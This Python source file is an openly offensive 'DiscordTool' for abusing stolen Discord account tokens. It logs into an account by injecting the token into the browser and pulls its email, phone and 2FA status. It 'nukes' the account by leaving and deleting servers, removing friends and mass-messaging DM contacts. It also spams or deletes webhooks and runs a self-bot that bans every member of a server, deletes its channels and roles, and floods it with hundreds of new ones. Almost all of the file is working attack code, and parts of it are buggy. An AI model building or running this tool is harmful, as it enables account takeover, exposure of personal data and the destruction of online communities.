import threading, requests, discord, random, time, os, urllib, sys
from discord.ext.commands.core import check

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from discord.ext import commands
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

init(convert=True)

messages = []
guildsIds = []
friendsIds = []
channelIds = []
clear = lambda: os.system('cls')
clear()

def main():
    clear()
    print(f'''{Fore.MAGENTA}
        ██████╗ ██╗ ██████╗ █████╗  █████╗ ██████╗ ██████╗   ████████╗ █████╗  █████╗ ██╗        ██████╗ ██╗   ██╗
        ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║        ██╔══██╗╚██╗ ██╔╝
        ██║  ██║██║╚█████╗ ██║  ╚═╝██║  ██║██████╔╝██║  ██║     ██║   ██║  ██║██║  ██║██║        ██████╔╝ ╚████╔╝ 
        ██║  ██║██║ ╚═══██╗██║  ██╗██║  ██║██╔══██╗██║  ██║     ██║   ██║  ██║██║  ██║██║        ██╔═══╝   ╚██╔╝  
        ██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║  ██║██████╔╝     ██║   ╚█████╔╝╚█████╔╝███████╗██╗██║        ██║   
        ╚═════╝ ╚═╝╚═════╝  ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═════╝      ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═╝╚═╝        ╚═╝   
                    ..: DiscordTool.py | Written by: 0x646f / ObsidianBreaker :..{Fore.RESET}
[{Fore.MAGENTA}1{Fore.RESET}] Log into a token    {Fore.CYAN}[Requires chromedriver.exe]{Fore.RESET}
[{Fore.MAGENTA}2{Fore.RESET}] TokenNuke the account
[{Fore.MAGENTA}3{Fore.RESET}] Spam a discord webhook
[{Fore.MAGENTA}4{Fore.RESET}] Delete a discord webhook
[{Fore.MAGENTA}5{Fore.RESET}] Grab info about the account
[{Fore.MAGENTA}6{Fore.RESET}] Self-bot for raiding servers

{Fore.MAGENTA}Changelog: {Fore.RESET}New Webhook Spammer, New Webhook Deleter and New Self-bot for raid.
''')
    print(f'[{Fore.MAGENTA}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))

    if choice == '1':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenLogin(token)

    elif choice == '2':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] Threads amount (number)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenNuke, args=(token, ))
            t.start()
    
    elif choice == '3':
        webhook_spammer()

    elif choice == '4':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] Discord webhook', end=''); webhook = input('  :  ')
        webhook_deleter(webhook)

    elif choice == '5':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenInfo(token)

    elif choice == '6':
        print(f'[{Fore.MAGENTA}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        selfbot_check(token)

    elif choice.isdigit() == False:
        main()

    else:
        main()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
            input("PRESS ENTER TO RETURN")
            main()

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.MAGENTA}User ID{Fore.RESET}]         {userID}
            [{Fore.MAGENTA}User Name{Fore.RESET}]       {userName}
            [{Fore.MAGENTA}2 Factor{Fore.RESET}]        {mfa}

            [{Fore.MAGENTA}Email{Fore.RESET}]           {email}
            [{Fore.MAGENTA}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.MAGENTA}Token{Fore.RESET}]           {token}

            ''')
            input("PRESS ENTER TO RETURN")
            main()
    else:
            print(f'{Fore.RED}ERROR{Fore.RESET} Bad Token')
            input("PRESS ENTER TO RETURN")
            main()

def tokenNuke(token):
    clear()
    headers = {'Authorization': token}
    confirm = input(f'Are you sure?')
    print(f"[{Fore.MAGENTA}+{Fore.RESET}] Nuking...")

    try:
          for guild in guildsIds:
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
            print(f'Left guild {guild}')
    except Exception as e:
        print(f'Error detected, ignoring. {e}')


        try:
            for friend in friendsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                print(f'Removed friend {friend}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')


        try:
            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
            for id in channelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'Sent message to private channel ID of {id}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

        try:
            for id in channelIds:
                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                print(f'Removed private channel ID {id}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')


        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
                print(f'Deleted guild {guild}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')


        try:
            gname = input('What would you like the spammed server name be. > ')
            gserv = input('How many servers would you like to be made. [max is 100 by discord]')
            for i in range(int(gserv)):
                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                print(f'Server {gname} made. Count: {i}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')


        try:
            modes = 'light'
        except Exception as e:
            print(f'Error detected, ignoring. {e}')


        try:
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    print("\nToken has been fucked.")
    input("PRESS ENTER TO RETURN")
    main()

def loadMessages():
    try:
        f = open('messages.txt', 'r')
        lines = f.read().split('\n')
        for line in lines:
            if(len(line)>3):
                messages.append(line)
        f.close()
    except Exception as e:
        print("Error loading messages: "+str(e))
        input("PRESS ENTER TO RETURN")
        main()

def webhook_spammer():
    print(f'[{Fore.MAGENTA}>{Fore.RESET}] Discord webhook', end=''); webhook = input('  :  ')
    print(f'[{Fore.MAGENTA}>{Fore.RESET}] Message to spam', end=''); msg = input('  :  ')
    print(f'[{Fore.MAGENTA}>{Fore.RESET}] Quantity', end=''); quantity = input('  :  ')
    spam(msg, webhook, quantity)

def spam(msg, webhook, quantity):
    try:
        cope = int(quantity)
    except:
            print("Insert a number! ")
            input("PRESS ENTER TO RETURN")
            main()

    if checkWebhook(webhook):
        for i in range(cope):
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"[" + str(i + 1) + "] Sended " + msg)
    input("PRESS ENTER TO RETURN")  
    main()

def checkWebhook(webhook):
    isActive = False
    try:
            r = requests.get(webhook, verify=False)
    except:
            print(f"[{Fore.RED}-{Fore.RESET}] INVALID URL")
            input("PRESS ENTER TO RETURN")
            main()

    if r.status_code == 200:
        isActive = True
    else :
        print(f"[{Fore.RED}-{Fore.RESET}] WEBHOOK OFFLINE")
        input("PRESS ENTER TO RETURN")       
        main()

    return isActive

def webhook_deleter(webhook):
    
    if checkWebhook(webhook):
        print(f"[{Fore.MAGENTA}+{Fore.RESET}] WEBHOOK ONLINE, DO YOU WANT DELETE IT?")
        wdel = input(f'Use y/n to decide> ')
        if wdel.lower() == 'y':
            try:
                requests.delete(webhook)
            except Exception as e:
                print(f'Error detected, ignoring. {e}')
    
    if checkWebhook(webhook) != True:
            print(f"[{Fore.MAGENTA}++{Fore.RESET}] THE WEBHOOK HAS BEEN DELETED.")
            input("PRESS ENTER TO RETURN")
            main()
    else:
            print(f"[{Fore.RED}--{Fore.RESET}] THE WEBHOOK HASN'T BEEN DELETED.")
            input("PRESS ENTER TO RETURN")
            main()

def selfbot_check(token):
    clear()

    print("Checking token if valid.")

    headers = {"Authorization": token}
    r = requests.get("https://discord.com/api/v8/users/@me/settings", headers=headers)
    if r.status_code == 401:
        print("Invalid token passed, please re-enter the token. [401]")
        input("PRESS ENTER TO RETURN")
        main()
    elif r.status_code == 200:
        print("Valid token passed. [200]")
        selfbot(token)

def selfbot(token):
    print("\nStarting self-bot...")

    prefix = "$"
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True, fetch_offline_members=False, intents=intents)
    bot.remove_command("help")
    bot.http.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'

    @bot.event
    async def on_ready():
        print(f'\nLogged onto: {bot.user.name}#{bot.user.discriminator}\nID: {bot.user.id}\nPrefix: {prefix}\nCommand: {prefix}nuke [Bans everyone, deletes all channels and roles, creates 250 roles and channels.]\n')

    @bot.command(pass_context=True)
    async def nuke(ctx):

        for m in ctx.guild.members:
            try:
                await ctx.guild.ban(m)
                print(f"{Fore.MAGENTA}[BAN]{Fore.RESET} Banned user {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[BAN]{Fore.RESET} Failed to ban user {Fore.YELLOW}{m} {Fore.RESET}ID: {Fore.YELLOW}{m.id}  {Fore.RESET}Reason: {Fore.YELLOW}Missing Permissions.")

        for c in ctx.guild.channels:
            try:
                await c.delete()
                print(f"{Fore.MAGENTA}[CHANNEL_DELETE] {Fore.RESET}Deleted channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[CHANNEL_DELETE] {Fore.RESET} Failed to delete channel {Fore.YELLOW}{c} {Fore.RESET}ID: {Fore.YELLOW}{c.id} {Fore.RESET}Reason:{Fore.YELLOW} Missing permissions.")

        for r in ctx.guild.roles:
            try:
                await r.delete()
                print(f"{Fore.MAGENTA}[ROLE_DELETE] {Fore.RESET}Deleted role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id}")
            except discord.Forbidden:
                print(f"{Fore.RED}[ROLE_DELETE] {Fore.RESET} Failed to delete role {Fore.YELLOW}{r} {Fore.RESET}ID: {Fore.YELLOW}{r.id} {Fore.RESET}Reason:{Fore.YELLOW} Missing permissions.")
            except Exception:
                print(f"{Fore.RED}[ROLE_DELETE] {Fore.RESET} Failed to delete role, unknown reason.")

        for x in range(0, 250):
            try:
                await ctx.guild.create_role(name="ObsidianNuker", colour=discord.Colour(0x673ab7))
                print(f"{Fore.MAGENTA}[ROLE_CREATE] {Fore.RESET}Created role, number: {x}")
            except Exception:
                print(f"{Fore.RED}[ROLE_CREATE] {Fore.RESET}Failed to create role.")

        for x in range(0, 170):
            try:
                await ctx.guild.create_text_channel('ObsidianNuker')
                print(f"{Fore.MAGENTA}[CHANNEL_CREATE] {Fore.RESET}Created text channel, number: {x}")
                await ctx.guild.create_voice_channel('ObsidianNuker')
                print(f"{Fore.MAGENTA}[CHANNEL_CREATE] {Fore.RESET}Created voice channel, number: {x}")
                await ctx.guild.create_category_channel('ObsidianNuker')
                print(f"{Fore.MAGENTA}[CHANNEL_CREATE] {Fore.RESET}Created category channel, number: {x}")
            except Exception:
                print(f"{Fore.RED}[CHANNEL_CREATE] {Fore.RESET}Failed to create channel")

    bot.run(token, bot=False)


        
if __name__ == '__main__':
    main()